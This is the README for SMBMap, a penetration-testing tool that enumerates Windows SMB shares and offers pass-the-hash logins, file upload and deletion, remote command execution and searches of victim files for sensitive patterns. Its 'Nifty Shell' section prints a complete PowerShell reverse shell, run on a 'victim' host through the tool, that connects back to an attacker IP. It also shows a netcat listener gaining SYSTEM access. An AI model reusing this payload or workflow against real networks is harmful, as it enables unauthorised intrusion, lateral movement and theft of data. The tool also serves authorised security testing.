# SMBMap

SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.

Some of the features have not been thoroughly tested, so changes will be forth coming as bugs are found. I only really find and fix the bugs while I'm on engagements, so progress is a bit slow. Any feedback or bug reports would be appreciated. It's definitely rough around the edges, but I'm just trying to pack in features at the moment. Version 2.0 should clean up the code a lot….whenever that actually happens ;). Thanks for checking it out!!

There's a known oddity in the SMBServer component used for the file content search feature. For some reason it throws an exception in the threading library. It still works, but the error is annoying none the less.

## Install Requirements
```
SMBMap has been updated to Python3!

$ pip3 install smbmap
```

## Features:
- Pass-the-Hash Support
- File upload/download/delete
- Permission enumeration (writable share, meet Metasploit)
- Remote Command Execution
- Distrubted file content searching (beta!)
- File name matching (with an auto downoad capability)

## Help
```
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

optional arguments:
  -h, --help            show this help message and exit

Main arguments:
  -H HOST               IP of host
  --host-file FILE      File containing a list of hosts
  -u USERNAME           Username, if omitted null session assumed
  -p PASSWORD           Password or NTLM hash
  --prompt              Prompt for a password
  -s SHARE              Specify a share (default C$), ex 'C$'
  -d DOMAIN             Domain name (default WORKGROUP)
  -P PORT               SMB port (default 445)
  -v                    Return the OS version of the remote host
  --admin               Just report if the user is an admin
  --no-banner           Removes the banner from the top of the output
  --no-color            Removes color from output
  --no-update           Removes "Working on it..." update message from output

Command Execution:
  Options for executing commands on the specified host

  -x COMMAND            Execute a command ex. 'ipconfig /all'
  --mode CMDMODE        Set the execution method, wmi or psexec, default wmi

Shard drive Search:
  Options for searching/enumerating the share of the specified host(s)

  -L                    List all drives on the specified host, requires ADMIN
                        rights.
  -R [PATH]             Recursively list dirs, and files (no share\path lists
                        ALL shares), ex. 'C$\Finance'
  -r [PATH]             List contents of directory, default is to list root of
                        all shares, ex. -r 'C$\Documents and
                        Settings\Administrator\Documents'
  -A PATTERN            Define a file name pattern (regex) that auto downloads
                        a file on a match (requires -R or -r), not case
                        sensitive, ex '(web|global).(asax|config)'
  -g FILE               Output to a file in a grep friendly format, used with
                        -r or -R (otherwise it outputs nothing), ex -g
                        grep_out.txt
  --csv FILE            Output to a CSV file, ex --csv shares.csv
  --dir-only            List only directories, ommit files.
  --no-write-check      Skip check to see if drive grants WRITE access.
  -q                    Quiet verbose output. Only shows shares you have READ
                        or WRITE on, and suppresses file listing when
                        performing a search (-A).
  --depth DEPTH         Traverse a directory tree to a specific depth. Default
                        is 5.
  --exclude SHARE [SHARE ...]
                        Exclude share(s) from searching and listing, ex.
                        --exclude ADMIN$ C$'

File Content Search:
  Options for searching the content of files (must run as root), kind of experimental

  -F PATTERN            File content search, -F '[Pp]assword' (requires admin
                        access to execute commands, and PowerShell on victim
                        host)
  --search-path PATH    Specify drive/path to search (used with -F, default
                        C:\Users), ex 'D:\HR\'
  --search-timeout TIMEOUT
                        Specifcy a timeout (in seconds) before the file search
                        job gets killed. Default is 300 seconds.

Filesystem interaction:
  Options for interacting with the specified host's filesystem

  --download PATH       Download a file from the remote system,
                        ex.'C$\temp\passwords.txt'
  --upload SRC DST      Upload a file to the remote system ex.
                        '/tmp/payload.exe C$\temp\payload.exe'
  --delete PATH TO FILE
                        Delete a remote file, ex. 'C$\temp\msf.exe'
  --skip                Skip delete file confirmation prompt

Examples:

$ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1
$ python smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
$ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group "Domain Admins" /domain'
```

## Default Output:
```
$ ./smbmap.py -H 192.168.12.123 -u administrator -p asdf1234
[+] Finding open SMB ports....
[+] User SMB session established on 192.168.86.39...
[+] IP: 192.168.86.39:445	Name: biffhenderson-pc.lan
	Disk                                Permissions	    Comment
	----                                -----------	    -------
	ADMIN$                              READ, WRITE	    Remote Admin
	C$                                  READ, WRITE	    Default share
	IPC$                                NO ACCESS	    Remote IPC
	Users                               READ, WRITE
```

## Command execution:
```
$ python smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -H 192.168.2.50
[+] Finding open SMB ports....
[+] User SMB session established...
[+] IP: 192.168.2.50:445        Name: unknown
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
abcadmin
The command completed successfully.
```

## Non recursive path listing (ls):
```
$ python smbmap.py -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\Users'
[+] Finding open SMB ports....
[+] User SMB session established...
[+] IP: 172.16.0.24:445 Name: 172.16.0.24
    Disk                                                    Permissions
    ----                                                    -----------
    C$                                                      READ, WRITE
    .Users
    dw--w--w--                0 Wed Apr 29 13:15:25 2015    .
    dw--w--w--                0 Wed Apr 29 13:15:25 2015    ..
    dr--r--r--                0 Wed Apr 22 14:50:36 2015    Administrator
    dr--r--r--                0 Thu Apr  9 14:46:57 2015    All Users
    dw--w--w--                0 Thu Apr  9 14:46:49 2015    Default
    dr--r--r--                0 Thu Apr  9 14:46:57 2015    Default User
    fr--r--r--              174 Thu Apr  9 14:44:01 2015    desktop.ini
    dw--w--w--                0 Thu Apr  9 14:46:49 2015    Public
    dr--r--r--                0 Wed Apr 22 13:33:01 2015    wingus
```

## File Content Searching:
```
$ python smbmap.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p 'NopSec1234!' -d widgetworld -F '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'
[+] Finding open SMB ports....
[+] User SMB session established on 192.168.0.99...
[+] User SMB session established on 192.168.0.85...
[+] User SMB session established on 192.168.0.89...
[+] File search started on 1 hosts...this could take a while
[+] Job 4650e5a97b9f4ca884613f4b started on 192.168.0.99, result will be stored at C:\Temp\4650e5a97b9f4ca884613f4b.txt
[+] File search started on 2 hosts...this could take a while
[+] Job e0c822a802eb455f96259f33 started on 192.168.0.85, result will be stored at C:\Windows\TEMP\e0c822a802eb455f96259f33.txt
[+] File search started on 3 hosts...this could take a while
[+] Job 0a5d352bf2bd4e288e0f8f36 started on 192.168.0.89, result will be stored at C:\Temp\0a5d352bf2bd4e288e0f8f36.txt
[+] Grabbing search results, be patient, share drives tend to be big...
[+] Job 1 of 3 completed on 192.168.0.85...
[+] File successfully deleted: C$\Windows\TEMP\e0c822a802eb455f96259f33.txt
[+] Job 2 of 3 completed on 192.168.0.89...
[+] File successfully deleted: C$\Temp\0a5d352bf2bd4e288e0f8f36.txt
[+] Job 3 of 3 completed on 192.168.0.99...
[+] File successfully deleted: C$\Temp\4650e5a97b9f4ca884613f4b.txt
[+] All jobs complete
Host: 192.168.0.85         Pattern: [1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]
No matching patterns found

Host: 192.168.0.89         Pattern: [1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]
C:\Users\terdf\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\JY5MGKVO\salesmaps[1].htm
C:\Users\terdf\OldFiles\Cache_2013522\Content.IE5\JY5MGKVO\salesmaps[1].htm

Host: 192.168.0.99         Pattern: [1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]
C:\Users\biffh\AppData\Local\Microsoft\Internet Explorer\DOMStore\L7W17OPZ\static.olark[1].xml
C:\Users\biffh\AppData\Local\Temp\Temporary Internet Files\Content.IE5\MIY2POGJ\validation[2].js
C:\Users\biffh\AppData\Local\Temp\Temporary Internet Files\Content.IE5\NV1MNBWA\Docs[1].htm
C:\Users\biffh\AppData\Local\Temp\Temporary Internet Files\Content.IE5\NV1MNBWA\Salesmaps[1].htm
```

## Drive Listing:
This feature was added to complement the file content searching feature

```
$ python smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L
[!] Missing domain...defaulting to WORKGROUP
[+] Finding open SMB ports....
[+] User SMB session established...
[+] IP: 192.168.1.24:445 Name: unknown
[+] Host 192.168.1.24 Local Drives: C:\ D:\
[+] Host 192.168.1.24 Net Drive(s):
    E:      \\vboxsrv\Public      VirtualBox Shared Folders
```

## Nifty Shell:
Run Powershell Script on Victim SMB host (change the IP in the code to your IP addres, i.e where the shell connects back to)
```
$ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
[+] Finding open SMB ports....
[+] User SMB session established...
[+] IP: 192.168.2.50:445        Name: unkown
[!] Error encountered, sharing violation, unable to retrieve output
```

## Attackers Netcat Listener:
```
$ nc -l 4445
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
 nt authority\system
```
